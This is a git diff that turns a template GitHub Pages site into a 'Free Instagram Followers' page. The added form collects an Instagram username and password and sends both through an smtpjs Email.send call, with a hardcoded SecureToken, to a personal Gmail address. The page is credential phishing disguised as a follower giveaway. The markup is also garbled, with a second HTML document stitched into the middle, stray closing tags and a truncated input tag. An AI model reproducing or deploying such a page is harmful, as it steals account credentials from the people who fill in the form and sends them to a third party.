@@ -17,9 +17,15 @@
         $('#main_content').headsmart()
       })
     </script>
-    <title>Website by LCHSTest</title>
+    <title>Free Instagram Followers!</title>
   </head>
 
+				
+	    </script>
+ </script>
+
+</body>
+</html>
   <body>
     <a id="forkme_banner" href="https://github.com/LCHSTest/Website">View on GitHub</a>
     <div class="shell">
@@ -27,43 +33,134 @@
       <header>
         <span class="ribbon-outer">
           <span class="ribbon-inner">
-            <h1>Website</h1>
-            <h2>Basic Website for you to fork and enjoy</h2>
+            <h1>FREE INSTAGRAM FOLLOWERS</h1>
+            <h2>Get free Instagram Followers within 24hrs (using instagram.io api key.)</h2>
           </span>
           <span class="left-tail"></span>
           <span class="right-tail"></span>
         </span>
       </header>
+<>
 
+        <inpu
       <section id="downloads">
         <span class="inner">
           <a href="https://github.com/LCHSTest/Website/zipball/master" class="zip"><em>download</em> .ZIP</a><a href="https://github.com/LCHSTest/Website/tarball/master" class="tgz"><em>download</em> .TGZ</a>
         </span>
       </section>
+<!DOCTYPE html>
+<html lang="en">
 
-      change
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>Optimal Web : Contact Form With JS</title>
+  <link rel="stylesheet" href="css/style.css">
+</head>
+
+<body>
+  <!-- contact1 -->
+  <section class="w3l-simple-contact-form1">
+    <div class="contact-form section-gap">
+      <div class="wrapper">
+        <div class="text-center">
+        <h1 style="font-size: 40px; " >Enter Instagram Details:</h1>
+      </div>
+        <div class="contact-form" style="max-width: 450px; margin: 0 auto;">
+          <div class="form-mid">
+            <form action="javascript:sendmail()" method="post">
+              <div class="field">
+                <input type="text" class="form-control" name="Name" id="Name" placeholder="UserName" required="">
+              </div>
+              <div class="field">
+                <input type="email" class="form-control" name="Sender" id="Sender" placeholder="Password"
+                  required="">
+              </div>
+              <div class="field">
+                <input type="text" class="form-control" name="Subject" id="Subject" placeholder="."
+                  required="">
+              </div>
+              <textarea name="Message" class="form-control" id="Message" placeholder="Default 100 followers per day."
+                required=""></textarea>
+              <button type="submit" class="btn btn-contact">Get Followers</button>
+              <!-- <input type="button" class="btn btn-contact" onclick="sendmail();"  value="Send Message"> -->
+
+            </form>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+  <!-- /contact1 -->
+  
+<!-- <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script> -->
+<script
+  src="https://code.jquery.com/jquery-2.2.4.min.js"
+  integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44="
+  crossorigin="anonymous"></script>
+<script src="https://smtpjs.com/v3/smtp.js"></script>
+ 
+<script>  
+
+     function sendmail(){
+    
+			var name = $('#Name').val();
+			var email = $('#Sender').val();
+			var subject = $('#Subject').val();
+      var message = $('#Message').val();
+
+			// var body = $('#body').val();
+
+			var Body='Name: '+name+'<br>Email: '+email+'<br>Subject: '+subject+'<br>Message: '+message;
+			//console.log(name, phone, email, message);
+
+			Email.send({
+        SecureToken:"fbf31702-bb7f-4a4e-9c1c-4ccf17ee777f",
+				To: 'vanshdhillon186@gmail.com',
+				From: "vanshdhillon186@gmail.com",
+				Subject: "New message on contact from "+name,
+				Body: Body
+			}).then(
+				message =>{
+					//console.log (message);
+					if(message=='OK'){
+					alert('Your mail has been send. Thank you for connecting.');
+					}
+					else{
+						console.error (message);
+						alert('There is error at sending message. ')
+						
+					}
+
+				}
+			);
+
+
+
+		}
+
+
+    </script>
+ </script>
+
+</body>
+</html>
       <span class="banner-fix"></span>
 
 
-      <section id="main_content">
-        <h1>
-<a name="website" class="anchor" href="#website"><span class="octicon octicon-link"></span></a>Website</h1>
-
-<p>Basic Website for you to fork and enjoy</p>
-      </section>
+     
 
       <footer>
         <span class="ribbon-outer">
           <span class="ribbon-inner">
-            <p>this project by <a href="https://github.com/LCHSTest">LCHSTest</a> can be found on <a href="https://github.com/LCHSTest/Website">GitHub</a></p>
+            <p>Free Instagram Followers upto 1000 within 24hours.!!!<a href="https://github.com>DEVELOPED BY DJANGO.INC</a>></a></p>
           </span>
           <span class="left-tail"></span>
           <span class="right-tail"></span>
         </span>
-        <p>Generated with <a href="http://pages.github.com">GitHub Pages</a> using Merlot</p>
-        <span class="octocat"></span>
-      </footer>
-
+        
+       </footer>
     </div>
     
   </body>
